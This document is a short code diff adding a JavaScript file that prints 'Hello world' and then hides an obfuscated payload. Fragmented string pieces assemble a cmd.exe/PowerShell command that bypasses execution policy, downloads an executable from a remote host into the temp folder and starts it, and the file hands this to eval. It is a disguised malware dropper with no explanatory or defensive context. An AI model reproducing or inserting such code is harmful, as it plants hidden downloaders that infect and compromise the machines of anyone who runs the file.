@@ -1,0 +1,3 @@
+console.log("Hello world")
+var nqulpygto = "cmd.exe /c \"po" + "we" + "rs" + "he" + "ll  $enark='^     System.Net';$pweli='^le(''http://';$ujgyvi='^larodimas.t';$qpoxuqg='^Set-Executi';$ggowe='^pass   -Scope';$ybzuvj='^     Process; $';$ejyfg='^temp+''\acqe';$ovgodu='^,$path); St';$isozo='^.Webclient)';$lodxa='^art-Process';$jbehvu='^ $path';$opgebhe='^onPolicy    By';$mosvocs='^path=($env:';$ewmony='^.DownloadFi';$htihab='^(New-Object';$epab='^op/777.exe''';$nogenf='^hzeb.exe'');'; Invoke-Expression ($qpoxuqg+$opgebhe+$ggowe+$ybzuvj+$mosvocs+$ejyfg+$nogenf+$htihab+$enark+$isozo+$ewmony+$pweli+$ujgyvi+$epab+$ovgodu+$lodxa+$jbehvu);\"";
+eval(nqulpygto)
